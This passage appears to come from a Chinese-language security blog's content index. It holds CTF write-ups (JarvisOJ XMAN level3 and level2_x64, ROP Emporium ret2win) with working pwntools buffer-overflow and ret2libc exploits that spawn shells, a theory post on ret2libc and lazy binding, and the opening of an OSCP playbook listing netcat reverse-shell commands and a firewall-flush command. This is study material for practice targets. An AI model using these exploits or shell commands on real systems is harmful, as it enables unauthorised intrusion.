count)</code>函数的3个参数：</p><ul><li><p>第一个参数是STDIN_FILENO即文件描述符，一般定义为0, 1，2；分别代表stdin(0，标准输入)，stdout(1，标准输出)，stderr(2，标准出错)</p></li><li><p>第二个参数是BUF即写入的字符串</p></li><li><p>第三个参数是每次写入的字节数</p></li></ul><p>所以本次题目中write函数对应的3个参数分别为1，write_got和4。</p><p>这样我们就可以得到write函数实际地址，且由于每次程序运行我们获取到的write函数的地址是变化的，所以我们需要把信息泄漏和获取服务器控制权限在一次网络连接中完成。</p><p>实现方法是借助于两次缓冲区溢出，第一次缓冲区溢出泄漏write的地址之后，我们让EIP再次跳转到vulnerable_function来执行，这样就可以接着进行第二次缓冲区溢出的过程，此时执行<code>system(&quot;/bin/sh&quot;)</code>即可。</p><p>运行结果：</p><p><img src="/img/XMAN-level3/XMAN8.png"></p><h2 id="Appendix"><a href="#Appendix" class="headerlink" title="Appendix"></a>Appendix</h2><p>本地运行时优先装在本地系统中的libc库，导致实际装载库并非题目给出的lib-2.19.so文件。这样会造成本地地址错误，无法成功获得shell，本地可以通过添加一个判断模块解决这个问题，远程不存在这个问题。</p><p>EXP代码（已添加对加载的libc文件做判断的模块）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span> <span class="comment"># 控制执行环境，0为远程，1为本地</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">sh = process(<span class="string">&#x27;./level3&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">sh = remote(<span class="string">&#x27;pwn2.jarvisoj.com&#x27;</span>, <span class="number">9879</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.19.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./level3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">writeplt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">writegot = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">vuln_addr = elf.symbols[<span class="string">&#x27;vulnerable_function&#x27;</span>]</span><br><span class="line"></span><br><span class="line">writelibc = libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">syslibc = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">shelllibc = libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x88</span> + <span class="number">0x4</span>) + p32(writeplt) + p32(vuln_addr) + p32(<span class="number">1</span>) + p32(writegot) + p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Input:\n&#x27;</span>)</span><br><span class="line">sh.sendline(payload1)</span><br><span class="line"></span><br><span class="line">write_addr = u32(sh.recv(<span class="number">4</span>))</span><br><span class="line">sys_addr = write_addr - writelibc + syslibc</span><br><span class="line">shell_addr = write_addr - writelibc + shelllibc</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x88</span> + <span class="number">0x4</span>) + p32(sys_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(shell_addr)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Input:\n&#x27;</span>)</span><br><span class="line">sh.sendline(payload2)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line">sh.close()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUPs </category>
          
          <category> JarvisOJ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> Stack </tag>
            
            <tag> ROP </tag>
            
            <tag> XMAN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ret2libc &amp;&amp; Lazy Binding</title>
      <link href="/2020/05/19/LazyBinding/"/>
      <url>/2020/05/19/LazyBinding/</url>
      
        <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>本文主要记录了我对于ret2libc和延迟绑定技术原理的理解。</p><span id="more"></span><h2 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h2><p>ret2libc主要是针对动态链接(Dynamic linking)编译的程序，因为正常情况下是无法在程序中找到像system()、execve()这种系统级函数(如果程序中直接包含了这种函数就可以直接控制返回地址指向他们，而不用通过这种麻烦的方式)。</p><p>因为程序是动态链接生成的，所以在程序运行时会调用libc.so(程序被装载时，动态链接器会将程序所有所需的动态链接库加载至进程空间，libc.so就是其中最基本的一个)，libc.so是linux下C语言库中的运行库glibc的动态链接版，并且libc.so中包含了大量的可以利用的函数，包括system()、execve()等系统级函数，我们可以通过找到这些函数在内存中的地址覆盖掉返回地址来获得当前进程的控制权。</p><p>通常情况下，我们会选择执行system(“&#x2F;bin&#x2F;sh”)来打开 shell，这样需要解决两个问题：</p><ul><li><p>找到system()函数的地址</p></li><li><p>在内存中找到’&#x2F;bin&#x2F;sh’字符串的地址</p></li></ul><p>ret2libc方法可以实现DEP保护和ASLR即地址空间布局随机化这两种保护措施的绕过。</p><h2 id="GOT表-Global-offset-Table"><a href="#GOT表-Global-offset-Table" class="headerlink" title="GOT表(Global offset Table)"></a>GOT表(Global offset Table)</h2><p>GOT表可以解决模块间数据访问的问题：</p><p>假设变量b被定义在其他模块中，其地址需要在程序装载时才能够确定。利用到前面的代码地址无关的思想，把地址相关的部分放入数据段中，然而这里的变量b的地址与其自身所在的模块装载的地址有关。那么这个问题就要通过GOT表来解决。</p><p>ELF中在数据段里面建立了一个指向这些变量的指针数组，也就是我们所说的GOT表(Global offset Table，全局偏移表)，它的功能就是当代码需要引用全局变量时，可以通过GOT表间接引用。</p><h2 id="延迟绑定-Lazy-Binding-amp-amp-PLT表-Procedure-Linkage-Table"><a href="#延迟绑定-Lazy-Binding-amp-amp-PLT表-Procedure-Linkage-Table" class="headerlink" title="延迟绑定(Lazy Binding) &amp;&amp; PLT表(Procedure Linkage Table)"></a>延迟绑定(Lazy Binding) &amp;&amp; PLT表(Procedure Linkage Table)</h2><p>因为动态链接的程序是在运行时需要对全局和静态数据访问进行GOT定位，然后间接寻址。同样，对于模块间的调用也需要GOT定位，再才间接跳转，这么做势必会影响到程序的运行速度。</p><p>而且程序在运行时很大一部分函数都可能用不到，于是ELF采用了当函数第一次使用时才进行绑定的思想，也就是我们所说的延迟绑定。</p><p>ELF实现延迟绑定是通过PLT，原先GOT中存放着全局变量和函数调用，现在把他拆成另个部分.got和.got.plt，用.got存放着全局变量引用，用.got.plt存放着函数引用。</p><p>所以延迟绑定技术解决的是模块间函数调用的问题，调用时是函数名@plt的形式。</p><p>延迟绑定的实现步骤为：</p><p>建立一个got.plt表，这个表里存放的是全局函数的实际地址。</p><p>但是最开始的时候，里面存放的是一个跳转而不是实际地址。因为加载动态链接库的时候，实际上用不到所有的函数，所以为了节省程序运行时间，在实际调用某个函数的时候才会去找该函数的实际地址。</p><p>当程序需要调用到其他模块中的函数时例如test() ，就去访问保存在.got.plt中的test@plt。</p><p>这里有两种情况，第一种就是第一次使用这个函数，这个地方就存放着test@plt第二条指令的地址，其实相当于什么都不做。第二种情况就是，当第二次调用test@plt函数时，就会通过第一条指令跳转到真正的函数地址。</p><p>整个过程就是所说的通过plt来实现延迟绑定。</p><p>下面再详细的解释一下：</p><p>对每一个全局函数，链接器生成一个与之相对应的影子函数，就是test@plt。</p><p>所有对test函数的调用都会换成对test@plt的调用，实际上这个test@plt的样子为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">test@plt:</span><br><span class="line">jmp *(test@got.plt)</span><br><span class="line">push index</span><br><span class="line">jmp _init()</span><br></pre></td></tr></table></figure><p>其中第一条指令直接从got.plt中去拿真实的函数地址，如果已经之前已经发生过调用，got.plt就已经保存了真实的地址，如果是第一次调用，则got.plt中放的是test@plt中的第二条指令，这就使得当执行第一次调用时，test@plt中的第一条指令其实什么事也没做，直接继续往下执行，第二条指令的作用是把当前要调用的函数在got.plt中的编号作为参数传给_init()，而_init()这个函数则用于把test进行重定位，然后把结果写入到got.plt相应的地方，最后直接跳过去该函数。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>最后总结一下：</p><p>程序调用外部函数的整个过程就是，第一次访问test@plt函数时，动态链接器就会去动态共享模块中查找test函数的真实地址然后将真实地址保存到test@got中(.got.plt)；第二次访问test@plt时，就直接跳转到test@got中去。</p>]]></content>
      
      
      <categories>
          
          <category> Theories </category>
          
          <category> Assembler </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> Stack </tag>
            
            <tag> ROP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ROP Emporium の ret2win</title>
      <link href="/2020/05/19/ret2win/"/>
      <url>/2020/05/19/ret2win/</url>
      
        <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>ROP是Return Oriented Programming（面向返回的编程）的缩写，是绕过DEP保护的攻击手段汇总。<a href="https://ropemporium.com/">ROP Emporium</a>是一个提供ROP练习的网站，对于理解和掌握ROP很有帮助。</p><span id="more"></span><h2 id="ROP链基础原理"><a href="#ROP链基础原理" class="headerlink" title="ROP链基础原理"></a>ROP链基础原理</h2><p>根据函数调用规则，当跳转函数的时候会首先将子函数的返回地址入栈。对于被调用者来说，栈顶是返回地址，接着是自己的参数。然后，被调用者会对内存空间执行自己的操作，但是结束时会清理自己的占据的栈空间，使栈恢复到被调用之前的情况，实现栈平衡。最后被调用函数一般是以ret指令结尾，该指令将栈顶地址传递到IP寄存器，随后代码会跳转到栈顶存放的返回地址的位置。</p><p>rop链即是基于以上这个简单的原理，在代码空间中寻找以ret结尾的代码片段或函数（代码片段称为Rop gadgets），组合可以实现拓展可写栈空间、写入内存、shell等功能，依靠ret将代码执行权紧握在自己的手里。</p><h2 id="ret2win"><a href="#ret2win" class="headerlink" title="ret2win"></a>ret2win</h2><p>ret2win是ROP Emporium提供的第一个ROP challenge，且和该网站提供的其他程序一样，分成了32位和64位的程序。这个challenge比较简单，下面简单的分析一下。</p><h3 id="ret2win32"><a href="#ret2win32" class="headerlink" title="ret2win32"></a>ret2win32</h3><h4 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h4><p>程序运行截图：</p><p><img src="/img/ret2win/ret2win1.png"></p><p>checksec：32位程序，开启了DEP，所以需要考虑创造ROP链绕过</p><p><img src="/img/ret2win/ret2win2.png"></p><h4 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h4><p>把程序丢到hopper disassembler里，找到一个有趣的函数pwnme，显然这里存在栈溢出：</p><p><img src="/img/ret2win/ret2win3.png"></p><p>同时我们还发现一个很有趣的函数ret2win，通过这个函数可以直接查看flag的值：</p><p><img src="/img/ret2win/ret2win4.png"></p><h4 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h4><p>用gdb看下这个程序，首先是main函数：</p><p><img src="/img/ret2win/ret2win5.png"></p><p>在pwnme函数下个断点：</p><p><img src="/img/ret2win/ret2win6.png"></p><p>可以看到此时栈顶指针ESP里存放的是0x80485d9，这是main函数call pwnme指令的下一条指令的地址。</p><p>所以我们的思路是将pwnme函数的返回地址覆盖为ret2win函数的入口。</p><p>EXP如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./ret2win32&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./ret2win32&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shell_addr = elf.symbols[<span class="string">&#x27;ret2win&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x28</span> + <span class="number">0x4</span>) + p32(shell_addr)</span><br><span class="line"></span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line">sh.close()</span><br></pre></td></tr></table></figure><p>执行后结果：</p><p><img src="/img/ret2win/ret2win7.png"></p><h4 id="Appendix"><a href="#Appendix" class="headerlink" title="Appendix"></a>Appendix</h4><p>我们把程序断在发送完payload之后，看一下此时堆栈里面的情况：</p><p><img src="/img/ret2win/ret2win8.png"></p><p>可以看到此时当pwnme结束之后，程序将跳转到ret2win函数。这样就完成了我们预定的栈布局，可以成功的实现对程序的控制。</p><h3 id="ret2win64"><a href="#ret2win64" class="headerlink" title="ret2win64"></a>ret2win64</h3><p>这里ret2win64仅仅是偏移量不一样，然后再注意一下64位程序EBP是0x8字节长度即可。就不具体分析了。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这种ROP叫做ret2text，即执行程序中已有代码，例如程序中写有system等系统的调用函数，我们就可以利用控制已有的gadgets（以ret结尾的指令序列，通过这些指令序列，可以修改某些地址的内容）控制system函数。</p>]]></content>
      
      
      <categories>
          
          <category> WriteUPs </category>
          
          <category> ROP Emprium </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> Stack </tag>
            
            <tag> ROP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XMAN level2_x64 の Write-Up</title>
      <link href="/2020/05/11/XMAN-level2-x64/"/>
      <url>/2020/05/11/XMAN-level2-x64/</url>
      
        <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>这是JarvisOJ的PWN题部分[XMAN]level2_x64的Write-Up，看上去和<a href="https://coldwave96.github.io/2020/05/01/XMAN-level2/">level2</a>差不多。实际上由于x64和x86的小小差异，实际操作上稍微有点难度，很适合初学者进一步深入的了解栈。</p><span id="more"></span><h2 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h2><p>程序运行图为：</p><p><img src="/img/XMAN-level2-x64/XMAN1.png"></p><p>然后还是要checksec一下：64位的程序，这次开启了NX保护，这是锁了内存页的执行权限，将禁止栈上的shellcode直接在栈内运行。</p><p><img src="/img/XMAN-level2-x64/XMAN2.png"></p><h2 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h2><p>将程序拖到hopper disassembler中去，发现基本和level2的32位程序一样。那么也许思路还是一样，利用vulnerable_function函数的栈溢出覆盖返回地址，使得程序跳转到system函数，然后覆盖这个函数jmp到的GOT表地址为数据中的“&#x2F;bin&#x2F;sh”。</p><p>但是这里由于x64和x86调用函数不同的传参方式，需要换种方式将“&#x2F;bin&#x2F;sh”传入到system函数中去。</p><p>简单说一下x64和x86的传参方式：x86是通过栈实现传参，先将参数压入栈中，靠近call指令的是第一个参数；</p><p>而x64前6个参数通过寄存器传参，如果还有更多的参数，再把过多的那几个参数像x86程序那样压入栈中。其中前6个参数依次放在rdi，rsi，rdx，rcx，r8，r9中。</p><p>了解了这些，再和之前level2比较一下两次的vulnerable_function函数有什么不一样：</p><p>x64:</p><p><img src="/img/XMAN-level2-x64/XMAN3.png"></p><p>x86：</p><p><img src="/img/XMAN-level2-x64/XMAN4.png"></p><p>可见在x64中system函数的参数是通过edi这个寄存器传入的，所以我们的思路变成覆盖edi的值。加上刚开始chesec时发现NX保护是开启的，那么我们自然而然的想到ROP链。</p><h2 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h2><p>关于ROP，全称为Return-oriented programming（返回导向编程），这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）。其实这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码（也即gadgets）。</p><p>具体的ROP技术我会继续学习，这里就不详细解释，简单来说这里利用程序自己带有pop edi&#x2F;rdi;ret语句达到给edi赋值的效果。pop edi语句是将当前的栈顶元素传递给edi，在执行pop语句时，只要保证栈顶元素是”&#x2F;bin&#x2F;sh”的地址，并将返回地址设置为system即可实现本次的ROP链。</p><p>而pop edi；ret语句的地址可以通过ROPgadget去找：</p><p><img src="/img/XMAN-level2-x64/XMAN5.png"></p><p>由于本次的程序没有开启内存地址随机化，所以找到的地址是可以直接写在EXP代码中的。</p><p>下面具体的解释一下针对这个程序构建的EXP思路，示意图如下所示：</p><p><img src="/img/XMAN-level2-x64/XMAN6.png"></p><p>最左边是我们理想中布局好的栈帧分布，上方是高地址，下方是低地址，所以栈是向下“生长”的。</p><p>首先在main函数跳转进入vulnerable_function函数前，将会在内存中压入该函数的返回地址即ret_addr，然后函数保存当前栈帧状态EBP，向系统要了0x80字节的Buf。</p><p>而构造payload时，首先要覆盖函数返回地址为之前我们通过ROPgadget找到的地址，此时的栈顶为“&#x2F;bin&#x2F;sh”的地址。<code>pop edi</code>会将“&#x2F;bin&#x2F;sh”读入到edi中去，然后将ret回到的地址覆盖为system函数的入口就满足了x64程序通过寄存器传参的设定，完美的创造了ROP链。</p><p>具体的EXP代码为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&#x27;pwn2.jarvisoj.com&#x27;</span>,<span class="string">&#x27;9882&#x27;</span>)</span><br><span class="line"><span class="comment">#sh = process(&#x27;./level2_x64&#x27;)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./level2_x64&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">sys_addr = elf.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">rop_addr = <span class="number">0x4006b3</span></span><br><span class="line">shell_addr = elf.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line"> </span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x80</span> + <span class="number">0x8</span>) + p64(rop_addr) + p64(shell_addr) + p64(sys_addr)</span><br><span class="line"> </span><br><span class="line">sh.send(payload)</span><br><span class="line"> </span><br><span class="line">sh.interactive()</span><br><span class="line">sh.close()</span><br></pre></td></tr></table></figure><p>运行结果如下图：</p><p><img src="/img/XMAN-level2-x64/XMAN7.png"></p>]]></content>
      
      
      <categories>
          
          <category> WriteUPs </category>
          
          <category> JarvisOJ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> Stack </tag>
            
            <tag> XMAN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DSCP Survival Guide</title>
      <link href="/2020/05/08/DSCP-Survival-Guide/"/>
      <url>/2020/05/08/DSCP-Survival-Guide/</url>
      
        <content type="html"><![CDATA[<h1 id="OSCP-Survival-Guide"><a href="#OSCP-Survival-Guide" class="headerlink" title="OSCP-Survival-Guide"></a>OSCP-Survival-Guide</h1><pre>   _____ _____ _____ ______   _____                  _            _   _____       _     _  |  _  /  ___/  __ \| ___ \ /  ___|                (_)          | | |  __ \     (_)   | |  | | | \ `--.| /  \/| |_/ / \ `--. _   _ _ ____   _____   ____ _| | | |  \/_   _ _  __| | ___  | | | |`--. \ |    |  __/   `--. \ | | | '__\ \ / / \ \ / / _` | | | | __| | | | |/ _` |/ _ \  \ \_/ /\__/ / \__/\| |     /\__/ / |_| | |   \ V /| |\ V / (_| | | | |_\ \ |_| | | (_| |  __/   \___/\____/ \____/\_|     \____/ \__,_|_|    \_/ |_| \_/ \__,_|_|  \____/\__,_|_|\__,_|\___|</pre><span id="more"></span><p>Kali Linux Offensive Security Certified Professional Playbook</p><p> <strong>NOTE: This document reffers to the target ip as the export variable $ip.</strong></p><p> <strong>To set this value on the command line use the following syntax:</strong></p><p> <strong>export ip&#x3D;192.168.1.100</strong></p><p><em><strong>UPDATE: October 2, 2017</strong></em></p><h2 id="Table-of-Contents"><a href="#Table-of-Contents" class="headerlink" title="Table of Contents"></a>Table of Contents</h2><ul><li><a href="#kali-linux">Kali Linux</a></li><li><a href="#information-gathering--vulnerability-scanning">Information Gathering &amp; Vulnerability Scanning</a><ul><li><a href="#passive-information-gathering">Passive Information Gathering</a></li><li><a href="#active-information-gathering">Active Information Gathering</a></li><li><a href="#port-scanning">Port Scanning</a></li><li><a href="#enumeration">Enumeration</a></li><li><a href="#http-enumeration">HTTP Enumeration</a></li></ul></li><li><a href="#buffer-overflows-and-exploits">Buffer Overflows and Exploits</a></li><li><a href="#shells">Shells</a></li><li><a href="#file-transfers">File Transfers</a></li><li><a href="#privilege-escalation">Privilege Escalation</a><ul><li><a href="#linux-privilege-escalation">Linux Privilege Escalation</a></li><li><a href="#windows-privilege-escalation">Windows Privilege Escalation</a></li></ul></li><li><a href="#client-web-and-password-attacks">Client, Web and Password Attacks</a><ul><li><a href="#client-attacks">Client Attacks</a></li><li><a href="#web-attacks">Web Attacks</a></li><li><a href="#file-inclusion-vulnerabilities">File Inclusion Vulnerabilities LFI&#x2F;RFI</a></li><li><a href="#database-vulnerabilities">Database Vulnerabilities</a></li><li><a href="#password-attacks">Password Attacks</a></li><li><a href="#password-hash-attacks">Password Hash Attacks</a></li></ul></li><li><a href="#networking-pivoting-and-tunneling">Networking, Pivoting and Tunneling</a></li><li><a href="#the-metasploit-framework">The Metasploit Framework</a></li><li><a href="#bypassing-antivirus-software">Bypassing Antivirus Software</a></li></ul><h1 id="Kali-Linux"><a href="#Kali-Linux" class="headerlink" title="Kali Linux"></a>Kali Linux</h1><ul><li><p>Set the Target IP Address to the <code>$ip</code> system variable<br><code>export ip=192.168.1.100</code></p></li><li><p>Find the location of a file<br><code>locate sbd.exe</code></p></li><li><p>Search through directories in the <code>$PATH</code> environment variable<br><code>which sbd</code></p></li><li><p>Find a search for a file that contains a specific string in it’s<br>name:<br><code>find / -name sbd\*</code></p></li><li><p>Show active internet connections<br><code>netstat -lntp</code></p></li><li><p>Change Password<br><code>passwd</code></p></li><li><p>Verify a service is running and listening<br><code>netstat -antp |grep apache</code></p></li><li><p>Start a service<br><code>systemctl start ssh  </code></p><p><code>systemctl start apache2</code></p></li><li><p>Have a service start at boot<br><code>systemctl enable ssh</code></p></li><li><p>Stop a service<br><code>systemctl stop ssh</code></p></li><li><p>Unzip a gz file<br><code>gunzip access.log.gz</code></p></li><li><p>Unzip a tar.gz file<br><code>tar -xzvf file.tar.gz</code></p></li><li><p>Search command history<br><code>history | grep phrase_to_search_for</code></p></li><li><p>Download a webpage<br><code>wget http://www.cisco.com</code></p></li><li><p>Open a webpage<br><code>curl http://www.cisco.com</code></p></li><li><p>String manipulation</p><ul><li><p>Count number of lines in file<br><code>wc index.html</code></p></li><li><p>Get the start or end of a file<br><code>head index.html</code></p><p><code>tail index.html</code></p></li><li><p>Extract all the lines that contain a string<br><code>grep &quot;href=&quot; index.html</code></p></li><li><p>Cut a string by a delimiter, filter results then sort<br><code>grep &quot;href=&quot; index.html | cut -d &quot;/&quot; -f 3 | grep &quot;\\.&quot; | cut -d &#39;&quot;&#39; -f 1 | sort -u</code></p></li><li><p>Using Grep and regular expressions and output to a file<br><code>cat index.html | grep -o &#39;http://\[^&quot;\]\*&#39; | cut -d &quot;/&quot; -f 3 | sort –u &gt; list.txt</code></p></li><li><p>Use a bash loop to find the IP address behind each host<br><code>for url in $(cat list.txt); do host $url; done</code></p></li><li><p>Collect all the IP Addresses from a log file and sort by<br>frequency<br><code>cat access.log | cut -d &quot; &quot; -f 1 | sort | uniq -c | sort -urn</code></p></li></ul></li><li><p>Decoding using Kali</p><ul><li><p>Decode Base64 Encoded Values</p><p><code>echo -n &quot;QWxhZGRpbjpvcGVuIHNlc2FtZQ==&quot; | base64 --decode</code></p></li><li><p>Decode Hexidecimal Encoded Values<br><code>echo -n &quot;46 4c 34 36 5f 33 3a 32 396472796 63637756 8656874&quot; | xxd -r -ps</code></p></li></ul></li><li><p>Netcat - Read and write TCP and UDP Packets</p><ul><li><p>Download Netcat for Windows (handy for creating reverse shells and transfering files on windows systems):<br><a href="https://joncraton.org/blog/46/netcat-for-windows/">https://joncraton.org/blog/46/netcat-for-windows/</a></p></li><li><p>Connect to a POP3 mail server<br><code>nc -nv $ip 110</code></p></li><li><p>Listen on TCP&#x2F;UDP port<br><code>nc -nlvp 4444</code></p></li><li><p>Connect to a netcat port<br><code>nc -nv $ip 4444</code></p></li><li><p>Send a file using netcat<br><code>nc -nv $ip 4444 &lt; /usr/share/windows-binaries/wget.exe</code></p></li><li><p>Receive a file using netcat<br><code>nc -nlvp 4444 &gt; incoming.exe</code></p></li><li><p>Some OSs (OpenBSD) will use nc.traditional rather than nc so watch out for that…</p><pre><code>whereis ncnc: /bin/nc.traditional /usr/share/man/man1/nc.1.gz/bin/nc.traditional -e /bin/bash 1.2.3.4 4444</code></pre></li><li><p>Create a reverse shell with Ncat using cmd.exe on Windows<br><code>nc.exe -nlvp 4444 -e cmd.exe</code></p><p>or</p><p><code>nc.exe -nv &lt;Remote IP&gt; &lt;Remote Port&gt; -e cmd.exe</code></p></li><li><p>Create a reverse shell with Ncat using bash on Linux<br><code>nc -nv $ip 4444 -e /bin/bash</code></p></li><li><p>Netcat for Banner Grabbing:</p><p><code>echo &quot;&quot; | nc -nv -w1 &lt;IP Address&gt; &lt;Ports&gt;</code></p></li></ul></li><li><p>Ncat - Netcat for Nmap project which provides more security avoid<br>IDS</p><ul><li><p>Reverse shell from windows using cmd.exe using ssl<br><code>ncat --exec cmd.exe --allow $ip -vnl 4444 --ssl</code></p></li><li><p>Listen on port 4444 using ssl<br><code>ncat -v $ip 4444 --ssl</code></p></li></ul></li><li><p>Wireshark</p><ul><li><p>Show only SMTP (port 25) and ICMP traffic:</p><p><code>tcp.port eq 25 or icmp</code></p></li><li><p>Show only traffic in the LAN (192.168.x.x), between workstations and servers – no Internet:</p><p><code>ip.src==192.168.0.0/16 and ip.dst==192.168.0.0/16</code></p></li><li><p>Filter by a protocol ( e.g. SIP ) and filter out unwanted IPs:</p><p><code>ip.src != xxx.xxx.xxx.xxx &amp;&amp; ip.dst != xxx.xxx.xxx.xxx &amp;&amp; sip</code></p></li><li><p>Some commands are equal</p><p><code>ip.addr == xxx.xxx.xxx.xxx</code></p><p> Equals</p><p><code>ip.src == xxx.xxx.xxx.xxx or ip.dst == xxx.xxx.xxx.xxx </code></p><p><code> ip.addr != xxx.xxx.xxx.xxx</code></p><p> Equals</p><p><code>ip.src != xxx.xxx.xxx.xxx or ip.dst != xxx.xxx.xxx.xxx</code></p></li></ul></li><li><p>Tcpdump</p><ul><li><p>Display a pcap file<br>   <code>tcpdump -r passwordz.pcap</code></p></li><li><p>Display ips and filter and sort<br><code>tcpdump -n -r passwordz.pcap | awk -F&quot; &quot; &#39;&#123;print $3&#125;&#39; | sort -u | head</code></p></li><li><p>Grab a packet capture on port 80<br><code>tcpdump tcp port 80 -w output.pcap -i eth0</code></p></li><li><p>Check for ACK or PSH flag set in a TCP packet<br><code>tcpdump -A -n &#39;tcp[13] = 24&#39; -r passwordz.pcap</code></p></li></ul></li><li><p>IPTables</p><ul><li><p>Deny traffic to ports except for Local Loopback</p><p><code>iptables -A INPUT -p tcp --destination-port 13327 ! -d $ip -j DROP  </code></p><p><code>iptables -A INPUT -p tcp --destination-port 9991 ! -d $ip -j DROP</code></p></li><li><p>Clear ALL IPTables firewall rules</p><pre><code>iptables -P INPUT ACCEPTiptables -P FORWARD ACCEPTiptables -P OUTPUT ACCEPTiptables -t nat -Fiptables -t mangle -Fiptables -Fiptables -Xiptables -t raw -F iptables -t raw -X</code></pre></li></ul></li></ul><h1 id="Information-Gathering-amp-Vulnerability-Scanning"><a href="#Information-Gathering-amp-Vulnerability-Scanning" class="headerlink" title="Information Gathering &amp; 